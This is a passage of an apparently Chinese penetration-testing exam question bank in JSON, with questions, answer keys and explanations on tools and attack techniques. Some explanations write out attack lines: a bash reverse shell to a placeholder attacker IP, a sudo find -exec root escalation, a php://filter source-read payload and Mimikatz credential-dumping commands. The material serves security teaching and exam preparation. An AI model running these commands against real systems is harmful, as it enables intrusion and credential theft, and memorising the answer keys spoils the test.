与注册表Run键","~/.ssh/authorized_keys","新增隐藏账号与可疑服务","修改网页标题"],"a":3,"e":"权限维持常见手段：\u003cb>计划任务、启动项/服务、SSH公钥后门、隐藏账号、Webshell留后门\u003c/b>等，与应急排查项一一对应（会攻才更懂防）。修改网页标题属于页面篡改（表现），不是持久化机制。"},{"c":"pentest","t":"s","q":"恶意样本对抗杀毒软件的技术统称为（　）。","o":["免杀","加宽带","热备","灰度发布"],"a":0,"e":"\u003cb>免杀：修改特征码、混淆加壳、分离加载等方式绕过特征查杀\u003c/b>。防守不能依赖单一特征：行为检测、AMSI、应用白名单（AppLocker/WDAC）、禁用Temp等目录执行权限、情报联动多层布防。"},{"c":"pentest","t":"s","q":"CVSS基础分值9.1的漏洞应定为（　）级别。","o":["高危","严重（Critical）","中危","低危"],"a":1,"e":"CVSS评级：\u003cb>0.1–3.9低危、4.0–6.9中危、7.0–8.9高危、9.0–10.0严重\u003c/b>。但修复优先级还要叠加资产重要性、暴露面、利用成熟度（是否已有公开EXP/在野利用）与EPSS预测综合判断，高分不等于必须先修一切。"},{"c":"pentest","t":"s","q":"学习漏洞复现与渗透测试的合法环境是（　）。","o":["在线随意挑选真实网站","本地靶场（DVWA、Pikachu、vulhub等）与授权演练环境","公司生产环境","政府网站"],"a":1,"e":"\u003cb>本地靶场\u003c/b>：DVWA/Pikachu（Web基础）、vulhub（Docker一键复现真实CVE）、VulnHub/HTB（综合演练）；企业内部建演练环境并常态化红蓝对抗。\u003cb>对未经授权的真实系统测试即违法\u003c/b>，与是否造成损害无关。"},{"c":"pentest","t":"s","q":"在渗透测试中，信息收集阶段的核心目标是（　）。","o":["获取系统最高权限","尽可能全面了解目标架构、资产、技术栈与潜在攻击面","格式化目标硬盘","安装后门"],"a":1,"e":"\u003cb>信息收集决定攻击面认知：域名/子域名、IP段/端口/服务、指纹（CMS/框架/版本）、邮箱/人员信息、历史漏洞、泄露的凭证、云资源等\u003c/b>。收集越充分，攻击路径越清晰。攻防对抗中信息不对称是核心——你不知道的资产往往就是突破口。"},{"c":"pentest","t":"s","q":"arping命令的主要用途是（　）。","o":["测试网络带宽","使用ARP协议检测IP冲突或探测主机是否在线","管理路由表","分析DNS记录"],"a":1,"e":"\u003cb>arping通过发送ARP请求/应答检测目标IP是否在局域网中活跃、是否存在IP冲突\u003c/b>。与ping的区别：ping用ICMP，arping用ARP。在网络安全中可用于检测ARP欺骗（对比MAC地址是否变化）、扫描局域网存活主机。"},{"c":"pentest","t":"s","q":"关于Nmap的-U参数，以下描述正确的是（　）。","o":["扫描UDP端口","上传文件","更新Nmap","无此参数"],"a":0,"e":"\u003cb>nmap -sU执行UDP端口扫描\u003c/b>，-U不是独立参数。UDP扫描较慢（需要向每个端口发送探测报文并等待响应/超时），但可发现DNS(53)、SNMP(161)、TFTP(69)、NetBIOS(137-139)等UDP服务。扫描结果中open|filtered表示端口有响应但不确认是否真的开放。"},{"c":"pentest","t":"s","q":"在渗透测试中，“后渗透”（Post-Exploitation）阶段的主要目标是（　）。","o":["获取初始立足点","提权、信息收集、持久化、横向移动以扩大战果和获取高价值目标","提交渗透报告","清理工具痕迹"],"a":1,"e":"\u003cb>后渗透=已获得初始权限后的深度渗透\u003c/b>：提权（低→高权限）、信息收集（敏感数据/凭证/网络拓扑）、权限维持（后门/计划任务）、横向移动（SMB/WMI/Pass-the-Hash/Pass-the-Ticket）、数据窃取。后渗透是红队评估中价值最大的环节，暴露企业纵深防御和横向检测能力。"},{"c":"pentest","t":"s","q":"John the Ripper工具的主要用途是（　）。","o":["网络扫描","离线密码哈希破解（支持多种哈希格式和字典/规则攻击）","邮件发送","日志分析"],"a":1,"e":"\u003cb>John the Ripper是经典离线密码破解工具\u003c/b>，支持：Unix DES/MD5/SHA、Windows NTLM、Kerberos、MySQL、PDF等数十种哈希格式。攻击模式：字典+规则变换、增量模式、掩码模式。配合hashcat（GPU加速，速度快两个数量级）使用。从/etc/shadow或SAM中提取哈希后离线破解。"},{"c":"pentest","t":"s","q":"在渗透测试报告中，通常不包含的内容是（　）。","o":["漏洞描述与复现步骤","被测系统的所有源代码","漏洞风险等级（CVSS评分）与修复建议","测试范围与方法论"],"a":1,"e":"\u003cb>渗透报告标准内容：执行摘要、测试范围、方法论、漏洞列表（描述+截图+复现步骤+风险评级+修复建议）\u003c/b>。不应包含全部源代码（超出授权范围且不必要），但可包含关键代码片段用于说明漏洞原理。报告的受众是管理层+技术团队，需兼顾可读性和技术深度。"},{"c":"pentest","t":"s","q":"responder工具的工作原理是（　）。","o":["扫描漏洞","在局域网中伪造LLMNR/NBT-NS/MDNS响应，截获用户的NTLMv2哈希","发送钓鱼邮件","暴力破解密码"],"a":1,"e":"\u003cb>responder监听局域网中的LLMNR/NBT-NS/mDNS请求\u003c/b>，当用户访问不存在的资源名时伪造响应，诱使用户的计算机向攻击者发起NTLM认证，截获NTLMv2挑战-响应。防御：禁用LLMNR和NBT-NS（组策略）、启用SMB签名、教育用户不输入凭证。"},{"c":"pentest","t":"s","q":"BloodHound工具主要用于（　）。","o":["密码破解","分析Active Directory域环境中的攻击路径和权限关系图","Web漏洞扫描","流量分析"],"a":1,"e":"\u003cb>BloodHound使用图数据库分析AD中用户、组、计算机、会话、ACL等关系\u003c/b>，自动发现攻击路径（如：普通用户→某台计算机的本地管理员→可读取其他用户凭证→最终Domain Admin）。攻防双方都可用：红队找最短提权路径，蓝队识别高价值目标并加固。"},{"c":"pentest","t":"s","q":"Netcat（nc）被称为网络工具的“瑞士军刀”，以下哪个不是它的典型用途？（　）","o":["反向Shell连接","端口扫描（nc -zv）","文件传输","图形界面远程桌面"],"a":3,"e":"\u003cb>Netcat是命令行网络工具\u003c/b>，支持：监听端口（nc -lvp）、连接端口、反向Shell（目标主动连回攻击者）、端口扫描（nc -zv目标 端口范围）、文件传输（重定向管道）、简易聊天。但Netcat不支持图形界面，远程桌面需RDP/VNC/TeamViewer等工具。"},{"c":"pentest","t":"s","q":"Impacket工具库在渗透测试中主要用于（　）。","o":["Web自动化测试","Windows/AD域环境远程操作（如Pass-the-Hash、Kerberos票据操作、WMI远程执行等）","密码字典生成","Wi-Fi破解"],"a":1,"e":"\u003cb>Impacket是Python库，提供大量协议实现和工具\u003c/b>：secretsdump.py（导出AD域哈希）、wmiexec.py/psexec.py（远程命令执行）、mimikatz.py、getST.py/getTGT.py（Kerberos票据操作）、atexec.py（计划任务远程执行）。是AD域渗透测试必备工具集。"},{"c":"pentest","t":"f","q":"获得目标系统渗透测试的书面授权后，测试者可以在授权范围外自由扩展测试范围以发现更多漏洞。","a":1,"e":"错误。授权书明确限定测试范围（IP/域名/系统/时间），超出授权范围的任何测试行为均可能触犯刑法285/286条。即使出于善意“多测一点”，也是未授权行为。如需扩大范围，必须追加书面授权。"},{"c":"pentest","t":"s","q":"Wireshark中显示过滤器的正确语法是（　）。","o":["port == 80","port:80","port=80 only","show port 80"],"a":0,"e":"\u003cb>Wireshark显示过滤器使用类似C语言的语法\u003c/b>：port==80（端口）、ip.addr==192.168.1.1（IP）、http.request.method==POST（HTTP方法）、tcp.contains(&quot;password&quot;)（TCP载荷内容）。抓包过滤器（Capture Filter）使用BPF语法，如port 80。掌握过滤器是流量分析的基本功。"},{"c":"pentest","t":"s","q":"中间人攻击（MITM）的主要前提条件是（　）。","o":["知道目标密码","攻击者能拦截或篡改双方之间的通信流量","拥有管理员账号","目标系统离线"],"a":1,"e":"\u003cb>MITM前提：攻击者位于通信路径上（ARP欺骗、DNS劫持、WiFi热点、劫持路由/BGP等）\u003c/b>。HTTPS理论上可防MITM，但证书信任链被破坏（如伪造证书、用户忽略警告、SSL降级攻击）时HTTPS也失效。防御：证书锁定（HPKP/pinned cert）、HSTS、DNSSEC。"},{"c":"pentest","t":"s","q":"hashcat与John the Ripper相比的主要优势是（　）。","o":["仅支持Windows","利用GPU并行计算大幅加速密码破解速度（可达数十亿次/秒）","只能破解MD5","不支持字典攻击"],"a":1,"e":"\u003cb>hashcat支持GPU/CPU加速，破解速度远超纯CPU的John\u003c/b>。hashcat支持数百种哈希类型（-m参数指定）、多种攻击模式（字典-攻击模式0、掩码-3、规则-6、组合-1等）。配合rockyou.txt等大型字典+规则变换，可高效破解常见弱口令。仅限合法使用。"},{"c":"pentest","t":"s","q":"WAF（Web应用防火墙）常见的绕过技术不包括（　）。","o":["分块传输编码绕过","HPP参数污染","修改WAF配置白名单直接放行","编码变换（双重URL编码、Unicode编码）"],"a":2,"e":"\u003cb>WAF绕过思路：编码变换（URL/Unicode/Base64/双重编码）、分块传输（Chunked Transfer）、HPP参数污染（同名参数多次提交）、HTTP参数污染（HPP）、分号截断、内联注释（MySQL /*!50000*/）\u003c/b>。修改WAF配置白名单直接放行不是绕过，而是管理漏洞。"},{"c":"pentest","t":"s","q":"文件包含漏洞（File Inclusion）中，PHP伪协议php://filter的用途是（　）。","o":["上传文件","以Base64编码读取文件源码（不执行PHP代码）","删除文件","连接数据库"],"a":1,"e":"\u003cb>php://filter/read=convert.base64-encode/resource=index.php\u003c/b>可在不执行PHP的情况下以Base64读取源码，是LFI漏洞中最常用的利用方式。其他PHP伪协议：php://input（POST体作为PHP执行）、data://（内联代码执行）、zip://（压缩包内文件）。防御：参数白名单、关闭allow_url_include。"},{"c":"pentest","t":"s","q":"xsser、BeEF这类工具的用途是（　）。","o":["端口扫描","XSS漏洞利用与浏览器攻击框架（通过XSS控制受害者浏览器执行高级操作）","密码破解","数据库管理"],"a":1,"e":"\u003cb>BeEF通过XSS注入的JS Hook控制受害者浏览器\u003c/b>：获取Cookie、截屏、键盘记录、社会工程学模块（伪造登录框）、内网扫描、浏览器漏洞利用。xsser是XSS扫描和利用工具。防御：输入输出编码、CSP、HttpOnly Cookie。"},{"c":"pentest","t":"s","q":"Kerberoasting攻击利用的是（　）。","o":["Web应用漏洞","AD域中具有SPN的服务账户的TGS票据可被离线破解密码","Wi-Fi密码","DNS配置错误"],"a":1,"e":"\u003cb>Kerberoasting：任何域用户可请求具有SPN的服务账户的TGS票据（使用服务账户密码加密），然后离线破解密码\u003c/b>。当服务账户使用弱口令时即可提权。防御：服务账户使用强密码（25+字符）、定期轮换密码、监控异常TGS请求、使用Managed Service Accounts（gMSA）。"},{"c":"pentest","t":"s","q":"Pass-the-Hash攻击的核心原理是（　）。","o":["暴力破解密码","直接使用获取到的NTLM哈希进行身份认证，无需明文密码","利用SQL注入","钓鱼攻击"],"a":1,"e":"\u003cb>PtH：不需要知道明文密码，直接用NTLM哈希认证\u003c/b>（适用于NTLM协议场景：SMB/WMI/PsExec/WinRM/RDP受限支持）。工具：mimikatz、Impacket工具集。防御：启用Credential Guard（隔离凭据）、限制管理员登录、LSA保护、定期审计特权账户。"},{"c":"pentest","t":"s","q":"DNS区域传送（Zone Transfer）漏洞的安全风险是（　）。","o":["加速DNS解析","攻击者可获取域内全部主机记录，暴露完整内部网络拓扑","仅影响外部DNS","不影响安全"],"a":1,"e":"\u003cb>AXFR请求触发区域传送，DNS服务器返回整个域的记录\u003c/b>：A记录、MX记录、NS记录等，暴露内部网络拓扑、IP分配、服务器命名规则。工具：dig axfr @ns.example.com example.com、dnsrecon。防御：限制允许zone transfer的IP（仅从DNS服务器和备份服务器）。"},{"c":"pentest","t":"s","q":"反向Shell与正向Shell的区别是（　）。","o":["没有区别","反向Shell由目标主动连回攻击者（穿透防火墙），正向Shell在目标上监听端口等待连接","正向Shell更安全","反向Shell只在Windows上使用"],"a":1,"e":"\u003cb>反向Shell：目标出站连接攻击者监听端口，绕过入站防火墙限制\u003c/b>（企业通常允许出站80/443）；\u003cb>正向Shell：目标开放端口监听，攻击者主动连接\u003c/b>（被防火墙阻挡）。实际渗透中反向Shell更常用。各种语言的反弹一句话命令是基本功。"},{"c":"pentest","t":"s","q":"AWVS、Nessus、OpenVAS这三款工具的主要用途是（　）。","o":["流量抓包","Web漏洞扫描、商业综合漏洞扫描、开源漏洞扫描","密码破解","社交工程"],"a":1,"e":"\u003cb>AWVS专注Web应用漏洞扫描（XSS/SQLi/目录遍历等）\u003c/b>；\u003cb>Nessus（Tenable）是商业综合漏洞扫描器，支持主机/网络/Web/云扫描\u003c/b>；\u003cb>OpenVAS是Nessus的开源替代\u003c/b>。三者都是自动化扫描工具，扫描结果需人工验证排除误报，不能替代人工渗透测试。"},{"c":"pentest","t":"s","q":"Linux中使用netcat反弹shell的典型方法是（　）。","o":["nc -lvp 4444","使用bash内置/dev/tcp伪设备建立TCP连接并反弹交互式shell","ping 攻击者IP","wget 攻击者IP"],"a":1,"e":"\u003cb>bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1\u003c/b>利用bash内置的/dev/tcp伪设备建立TCP连接并反弹交互式shell。不同环境可能用不同方法：Python、PHP、Perl、nc -e、mkfifo等。PowerShell反弹shell常用于Windows环境。"},{"c":"pentest","t":"s","q":"内网横向移动中，PsExec工具的原理是（　）。","o":["修改DNS记录","通过SMB连接上传并执行远程服务（可替代RDP远程执行命令）","修改防火墙规则","截获邮件"],"a":1,"e":"\u003cb>PsExec通过SMB连接目标，上传可执行文件到ADMIN$共享，创建并启动远程服务执行命令\u003c/b>。属于远程服务执行类横向移动。Impacket的psexec.py实现相同功能且不需要上传文件（直接使用named pipe）。防御：限制SMB出站、限制管理员远程登录。"},{"c":"pentest","t":"s","q":"在抓包分析中，识别明文传输密码的最有效方法是（　）。","o":["查看IP头","使用Follow TCP Stream功能查看HTTP/FTP/SMTP等明文协议载荷","查看MAC地址","分析路由表"],"a":1,"e":"\u003cb>明文协议（HTTP、FTP、Telnet、SMTP、IMAP）传输的口令直接暴露在数据包载荷中\u003c/b>。Wireshark中 Follow TCP Stream 可完整还原一次会话内容，搜索password/pass等关键字可快速定位。这就是为什么生产环境必须使用HTTPS/SFTP/SSH替代明文协议。"},{"c":"pentest","t":"s","q":"Chisel、frp、ngrok等工具的共同用途是（　）。","o":["Web开发","内网穿透/端口转发（将内网服务暴露到公网或穿透防火墙限制）","视频编辑","数据库管理"],"a":1,"e":"\u003cb>内网穿透工具：将无法直接访问的内网服务通过公网中继暴露出来\u003c/b>。frp（快速反向代理）最常用、ngrok一键暴露本地端口、chisel基于HTTP隧道。在红队中常用于将内网受害机的SSH/RDP/服务穿透到外网。防御：监控异常出站连接、域名白名单、行为分析。"},{"c":"pentest","t":"s","q":"在Web渗透中，SSRF（服务端请求伪造）攻击的关键危害是（　）。","o":["仅影响前端页面","攻击者可利用服务器发起内网请求，访问内部服务或读取本地文件","只影响数据库","加速页面加载"],"a":1,"e":"\u003cb>SSRF：攻击者构造恶意URL，服务器端发起请求\u003c/b>。危害：探测内网（http://192.168.1.1）、访问内部API（云元数据http://169.254.169.254获取AK/SK）、读取本地文件（file:///etc/passwd）、攻击内网Redis/MySQL。防御：URL白名单、禁止内网IP、禁用非必要协议。"},{"c":"pentest","t":"s","q":"Mimikatz工具的核心功能是（　）。","o":["端口扫描","从Windows内存中提取明文凭据（密码、NTLM哈希、Kerberos票据）","Web开发","网络配置"],"a":1,"e":"\u003cb>Mimikatz从LSASS进程内存中提取凭证\u003c/b>：sekurlsa::logonpasswords提取所有已登录用户的明文密码和哈希，kerberos::导出票据。需要SYSTEM权限运行。防御：启用 Credential Guard（虚拟化隔离凭据）、LSA Protection、限制本地管理员、定期改密。"},{"c":"pentest","t":"s","q":"漏洞利用验证（PoC）与完整漏洞利用（EXP）的区别是（　）。","o":["完全相同","PoC仅证明漏洞存在，EXP是完整武器化的攻击利用","PoC更危险","EXP更安全"],"a":1,"e":"\u003cb>PoC（Proof of Concept）：最小化证明漏洞可利用，通常无害（弹calc、写文件）\u003c/b>，用于安全研究和报告；\u003cb>EXP（Exploit）：完整武器化利用，获取权限/数据\u003c/b>。渗透测试中通常只使用PoC验证，不使用EXP。发布PoC时也应考虑是否会被恶意利用。"},{"c":"pentest","t":"f","q":"在渗透测试中，扫描器报告的高危漏洞一定都可以被成功利用。","a":1,"e":"错误。漏洞扫描器存在误报（False Positive），报告的漏洞需人工验证。某些漏洞在特定配置、补丁版本或环境下不可利用。扫描器只检测是否存在漏洞特征，不验证实际可利用性。这就是渗透测试比自动扫描更有价值的原因。"},{"c":"pentest","t":"s","q":"nmap中，-sS（SYN扫描）的原理是（　）。","o":["发送SYN，根据是否回SYN/ACK判断端口开放，不完成握手（半开扫描）","建立完整TCP连接","发送UDP包","ping探测"],"a":0,"e":"\u003cb>nmap -sS半开扫描：只发SYN，收到SYN/ACK=开放（随即RST断开不完成握手）、RST=关闭、无响应=过滤\u003c/b>，速度快且不易在目标留下完整连接日志。\u003cb>对比\u003c/b>：-sT完整连接扫描（更易被日志记录）、-sU UDP扫描、-sV版本探测、-sC默认脚本。\u003cb>易错点\u003c/b>：'-sS需要root权限'。\u003cb>记忆\u003c/b>：'SYN打一半就跑=半开扫描'。"},{"c":"pentest","t":"s","q":"nmap中，进行服务/版本探测的参数是（　）。","o":["-sV","-O","-p-","-oN"],"a":0,"e":"\u003cb>nmap -sV对开放端口进行\u003cb>服务与版本识别\u003c/b>（banner、指纹）；-O识别操作系统；-p-扫描全部65535端口；-oN输出文件\u003c/b>。\u003cb>易错点\u003c/b>：'识别'跑什么服务'用-sV'。\u003cb>记忆\u003c/b>：'-sV看服务，-O看系统'。"},{"c":"pentest","t":"s","q":"nmap中，-p- 的含义是（　）。","o":["扫描全部1-65535端口","扫描常用端口","扫描所有主机","扫描所有网段"],"a":0,"e":"\u003cb>nmap -p- 扫描\u003cb>全部65535个端口\u003c/b>（默认只扫常用端口），完整端口发现更全面但更慢\u003c/b>。\u003cb>扩展\u003c/b>：-p 1-1000指定范围、--top-ports n扫描最常用n个。\u003cb>易错点\u003c/b>：'漏扫非常用端口=漏掉后门入口'。\u003cb>记忆\u003c/b>：'-p-=端口大全扫'。"},{"c":"pentest","t":"s","q":"sqlmap工具的核心功能是（　）。","o":["自动化检测与利用SQL注入（含布尔/时间盲注、联合、文件读写、命令执行等）","端口扫描","漏洞利用框架","无线破解"],"a":0,"e":"\u003cb>sqlmap是\u003cb>自动化SQL注入检测与利用\u003c/b>工具：识别注入点类型（GET/POST/Header/Cookie）、探测数据库（--dbs/--tables/--dump）、文件读写（--file-read/--file-write）、OS命令执行（--os-shell）、绕过WAF（--tamper）\u003c/b>。\u003cb>易错点\u003c/b>：'sqlmap=注入专项自动化'。\u003cb>记忆\u003c/b>：'sqlmap一条命令，注入全流程'。"},{"c":"pentest","t":"s","q":"Metasploit（msf）框架中，用于生成/接收反向连接的监听组件是（　）。","o":["msfvenom（生成payload）+ handler/multi/handler（监听）","nmap","burpsuite","hydra"],"a":0,"e":"\u003cb>Metasploit利用流程：\u003cb>msfvenom生成含payload的木马（如windows/meterpreter/reverse_tcp）→目标执行→本地 use exploit/multi/handler 监听并反弹shell\u003c/b>；也提供exploit、auxiliary（辅助扫描）等模块\u003c/b>。\u003cb>易错点\u003c/b>：'msfvenom造子弹，handler收反弹'。\u003cb>记忆\u003c/b>：'生成payload用msfvenom，接收回连用handler'。"},{"c":"pentest","t":"s","q":"Burp Suite工具的主要模块与用途是（　）。","o":["Proxy拦截修改HTTP流量、Repeater重放请求、Intruder暴力枚举、Decoder编码解码","端口扫描","漏洞库管理","日志分析"],"a":0,"e":"\u003cb>Burp Suite是Web渗透测试核心工具：\u003cb>Proxy（代理拦截/修改请求）、Repeater（手工重放调试）、Intruder（自动化爆破/枚举）、Decoder/Comparer、Scanner（专业版漏洞扫描）\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'Burp=Web流量的手术台'。\u003cb>记忆\u003c/b>：'拦截Repeater重放Intruder爆破，Burp三件套'。"},{"c":"pentest","t":"s","q":"hydra工具的主要用途是（　）。","o":["在线暴力破解各协议登录口令（SSH/FTP/HTTP/RDP等）","端口扫描","SQL注入","无线破解"],"a":0,"e":"\u003cb>hydra（九头蛇）\u003cb>在线爆破\u003c/b>登录口令：hydra -l 用户名 -P 字典 ssh://目标，支持SSH/FTP/SMB/HTTP等多种服务\u003c/b>。\u003cb>对比\u003c/b>：john/hashcat做\u003cb>离线\u003c/b>破解（针对已获取的哈希）。\u003cb>易错点\u003c/b>：'在线爆破hydra，离线破解hashcat/john'。\u003cb>记忆\u003c/b>：'在线撞门用hydra，离线算哈希用hashcat'。"},{"c":"pentest","t":"s","q":"hashcat工具破解的对象是（　）。","o":["已获取的口令哈希（离线暴力/字典/规则/GPU加速）","在线登录接口","网络流量","磁盘加密"],"a":0,"e":"\u003cb>hashcat是\u003cb>离线口令哈希破解\u003c/b>工具：利用GPU高性能计算，对抓到的哈希（NTLM/MD5/bcrypt等）执行字典、掩码、规则攻击\u003c/b>。\u003cb>注意\u003c/b>：慢哈希（bcrypt/argon2）与加盐显著提高破解成本。\u003cb>易错点\u003c/b>：'拿到哈希才算开始（离线），online用hydra'。\u003cb>记忆\u003c/b>：'hashcat=GPU算哈希工厂'。"},{"c":"pentest","t":"s","q":"Linux提权中，利用sudo配置不当（如sudo -l发现可无密码执行某命令）提权的思路是（　）。","o":["sudo -l 查看可执行命令，若含危险命令（如find、vi、python）可借此以root执行","直接输入root口令","修改内核","重启进单用户"],"a":0,"e":"\u003cb>检查 sudo -l：若普通用户可\u003cb>无密码/免密\u003c/b>运行find、vi、python、cp等，可用其'-exec'、'!'、交互模式等\u003cb>以root执行命令\u003c/b>（如 \u003ccode>sudo find / -exec sh -i \\; \u003c/code>）\u003c/b>。\u003cb>易错点\u003c/b>：'危险sudo命令=提权捷径'。\u003cb>记忆\u003c/b>：'sudo -l先看一眼，有没有能借道提权的命令'。"},{"c":"pentest","t":"s","q":"SUID提权的检测与利用要点是（　）。","o":["find / -perm -4000 找root属主的SUID文件，可执行可被利用（如python、bash）则提权","只查目录权限","看磁盘空间","看网络连接"],"a":0,"e":"\u003cb>SUID提权：\u003ccode>find / -perm -4000 -type f\u003c/code>列出SUID文件；若root属主且是\u003cb>可交互/可执行命令\u003c/b>（python、bash、perl、sudo）则执行后以root身份运行\u003c/b>。\u003cb>防护\u003c/b>：去除不必要的SUID位。\u003cb>易错点\u003c/b>：'SUID+root+可执行命令=提权口子'。\u003cb>记忆\u003c/b>：'先找4000，再看是不是危险命令'。"},{"c":"pentest","t":"s","q":"内网渗透中，'横向移动'的含义是（　）。","o":["在同一网络内从已控主机向其它主机扩散，利用共享凭据/漏洞获取更多控制","向外网攻击","只攻击一台","物理移动设备"],"a":0,"e":"\u003cb>横向移动：攻击者立足一台主机后，\u003cb>利用窃取的凭据（哈希/票据）、共享漏洞、管理通道（SMB/RDP/WMI）向同网内其他主机扩散\u003c/b>，最终接近核心目标（如域控）\u003c/b>。\u003cb>防护\u003c/b>：分段隔离、最小权限、禁用NTLM、检测异常横向流量。\u003cb>易错点\u003c/b>：'横向=内网蔓延'。\u003cb>记忆\u003c/b>：'一台失守=起点，横向移动=蔓延到全域'。"},{"c":"pentest","t":"s","q":"反弹Shell（Reverse Shell）相比正向Shell的优势是（　）。","o":["由被控端主动外连攻击端，可绕过入站防火墙/NAT限制","不需要任何端口","更隐蔽且无需连接","只能在公网用"],"a":0,"e":"\u003cb>反弹Shell由目标\u003cb>主动向外连接攻击者的监听端口\u003c/b>，绕过'只放行出站'的防火墙与NAT，攻击者不需暴露入站端口\u003c/b>。\u003cb>常见\u003c/b>：bash -i >& /dev/tcp/IP/port 0>&1、nc、PowerShell等。\u003cb>检测\u003c/b>：监控异常出站连接。\u003cb>易错点\u003c/b>：'内网打进来难，让目标打出去容易'。\u003cb>记忆\u003c/b>：'门口不让进，我就让里面主动出来'。"},{"c":"pentest","t":"s","q":"内网代理/隧道（Pivoting）工具（如frp、EarthWorm、SSH隧道）的作用是（　）。","o":["打通攻击机与被控内网的访问通道，转发流量进行进一步渗透","扫描端口","破解口令","抓包"],"a":0,"e":"\u003cb>隧道/代理（Pivoting）：把已控主机作为\u003cb>跳板\u003c/b>，把攻击流量经其转发到内网，让攻击机能访问内网目标（正向/反向代理、SOCKS隧道、SSH -L/-D端口转发）\u003c/b>。\u003cb>易错点\u003c/b>：'横向移动靠隧道打通访问路径'。\u003cb>记忆\u003c/b>：'借已控主机当'中转站'，一路打到内网深处'。"},{"c":"pentest","t":"s","q":"Web指纹识别的目的是（　）。","o":["识别目标使用的CMS/框架/中间件及版本，匹配已知漏洞","提高网速","加密流量","备份数据"],"a":0,"e":"\u003cb>指纹识别通过响应头、页面特征、文件路径、Cookie等\u003cb>确定目标使用的CMS（WordPress等）、框架、中间件、WAF及版本\u003c/b>，从而检索该版本已知漏洞精准利用\u003c/b>。\u003cb>工具\u003c/b>：WhatWeb、Wappalyzer、fofa等。\u003cb>易错点\u003c/b>：'识别身份→找版本漏洞'。\u003cb>记忆\u003c/b>：'先认人（指纹），再查案底（漏洞库）'。"},{"c":"pentest","t":"s","q":"目录扫描（目录爆破）工具（如dirb、gobuster、dirsearch）的用途是（　）。","o":["枚举Web目录/文件（备份、后台、源码、隐藏文件）","爆破登录口令","扫描端口","抓包分析"],"a":0,"e":"\u003cb>目录扫描用字典\u003cb>枚举站点的目录与文件\u003c/b>，发现后台入口、备份文件（.bak/.zip）、源码、敏感信息（.git泄露）等，扩大攻击面\u003c/b>。\u003cb>注意\u003c/b>：会产生大量404日志，易被WAF/日志告警发现。\u003cb>易错点\u003c/b>：'找隐藏资源靠目录爆破'。\u003cb>记忆\u003c/b>：'翻遍站点的'犄角旮旯'找宝贝'。"},{"c":"pentest","t":"s","q":"tcpdump抓包命令中，抓取eth0接口上到80端口且数量限制100个包的写法是（　）。","o":["tcpdump -i eth0 -c 100 port 80","tcpdump -f port 80","tcpdump -d eth0","tcpdump 无参数"],"a":0,"e":"\u003cb>tcpdump -i eth0 -c 100 port 80\u003c/b>：-i指定接口、-c限制抓包数量、port 80按端口过滤；-w保存pcap、-r读取。\u003cb>Wireshark对等过滤\u003c/b>：tcp.port==80。\u003cb>易错点\u003c/b>：'-i指定网卡、-c限制数量'。\u003cb>记忆\u003c/b>：'-i口、-c数、-w存、-r读'。"},{"c":"pentest","t":"s","q":"Wireshark中，过滤HTTP请求且包含'admin'字符串的显示过滤表达式是（　）。","o":["http.request && frame contains \"admin\"","tcp.port 80","ip.addr==1.1.1.1","http.port==8080"],"a":0,"e":"\u003cb>Wireshark显示过滤：\u003ccode>http.request && frame contains \"admin\"\u003c/code>筛选含'admin'的HTTP请求；常用过滤还有 http.response、tcp.port==443、dns.qry.name contains xx\u003c/b>。\u003cb>易错点\u003c/b>：'显示过滤用&&/contains，抓包过滤（Capture Filter）语法不同'。\u003cb>记忆\u003c/b>：'frame contains 关键字=找数据包里的内容'。"},{"c":"pentest","t":"s","q":"蓝队视角下，Webshell（如冰蝎、蚁剑、哥斯拉）连接的流量特征是（　）。","o":["加密/混淆流量、固定UA与响应特征、POST携带加密数据","普通静态页面","DNS请求","邮件发送"],"a":0,"e":"\u003cb>冰蝎/哥斯拉等加密型webshell：\u003cb>流量加密（AES等）、请求头含固定标识（UA、Accept）、POST体加密、响应特定，常规特征检测难发现\u003c/b>；蚁剑等有内置随机UA与固定流量特征\u003c/b>。\u003cb>检测\u003c/b>：基于行为（加密外传、脚本高频访问）+流量特征+EDR。\u003cb>易错点\u003c/b>：'加密webshell靠'行为+特征'联动检测'。\u003cb>记忆\u003c/b>：'流量加密+固定UA+高频POST=加密马特征'。"},{"c":"pentest","t":"s","q":"渗透测试报告的核心组成部分是（　）。","o":["测试范围与方法、漏洞列表（含等级与CVSS）、复现步骤、修复建议、风险综述","只列工具名","只写成功案例","不写修复建议"],"a":0,"e":"\u003cb>渗透测试报告要素：\u003cb>测试范围/授权/时间、漏洞明细（编号、等级、CVSS、复现步骤、影响）、修复建议（优先排序）、风险综述与总结\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'报告=发现+证据+修复，缺一不可'。\u003cb>记忆\u003c/b>：'范围、漏洞、证据、修复建议，四件套'。"},{"c":"pentest","t":"s","q":"CTF（Capture The Flag）竞赛中，Web方向题目常考察的技能是（　）。","o":["SQL注入、XSS、文件上传、反序列化、SSRF、命令注入等Web漏洞利用","硬件维修","法律条文背诵","公文写作"],"a":0,"e":"\u003cb>CTF Web题考察\u003cb>SQL注入、XSS/CSRF、文件上传、文件包含、反序列化、SSRF、命令注入、逻辑漏洞\u003c/b>等实际利用能力；其他方向：Pwn（二进制）、Reverse（逆向）、Crypto（密码）、Misc（杂项）\u003c/b>。\u003cb>易错点\u003c/b>：'CTF=理论+实战结合的练兵场'。\u003cb>记忆\u003c/b>：'Web/Pwn/Reverse/Crypto/Misc，五大方向'。"},{"c":"pentest","t":"s","q":"社工（社会工程学）攻击利用的是（　）。","o":["人的心理与行为弱点（诱导、信任、恐惧）而非技术漏洞","系统漏洞","网络协议缺陷","硬件故障"],"a":0,"e":"\u003cb>社工攻击利用\u003cb>人性弱点\u003c/b>：伪装客服骗取口令、钓鱼邮件诱导点击、假冒IT索要凭据等，往往比技术攻击更有效\u003c/b>。\u003cb>防护\u003c/b>：安全意识培训、钓鱼演练、MFA、双重确认机制。\u003cb>易错点\u003c/b>：'最薄弱的环节是人'。\u003cb>记忆\u003c/b>：'技术难打就骗人，人是最脆弱的一环'。"},{"c":"pentest","t":"s","q":"水坑攻击（Watering Hole）的特点是（　